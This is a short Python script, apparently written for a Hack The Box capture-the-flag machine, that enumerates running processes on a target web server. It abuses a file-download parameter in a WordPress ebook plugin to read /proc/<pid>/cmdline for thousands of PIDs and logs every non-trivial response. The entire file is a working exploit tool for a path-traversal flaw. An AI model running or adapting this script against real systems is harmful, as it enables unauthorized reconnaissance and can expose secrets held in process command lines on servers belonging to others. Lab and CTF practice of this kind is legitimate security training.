from pwn import *   
import requests, time, sys

def pids(url_main,lenght,total_pid):
    for i in range(total_pid):
        path = f'{url_main}/proc/{i}/cmdline'
        progress.status(f'/proc/{i}/cmdline')
        req = requests.get(path)

        if len(req.content) > lenght:
            print('')
            log.info(f'Request: {path}')
            log.info(f'Lenght: {len(req.content)}')
            log.info(f'Content: {req.content}\n\n')

log.info('PID ENUMERATION')
progress = log.progress('Bruteforcing PIDs')
time.sleep(2)
try:
    url_main = sys.argv[1]
    lenght = int(sys.argv[2])
    total_pid = int(sys.argv[3])
except:
    print('Use mode: python3 PID_enum.py <"url"> <min_lenght> <total_pid>')
    print('url = string (e.g. http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=) \nmin_lenght = int (e.g. 50) \ntotal_pid = int (e.g. 5000)')
    sys.exit(1)

pids(url_main, lenght, total_pid)
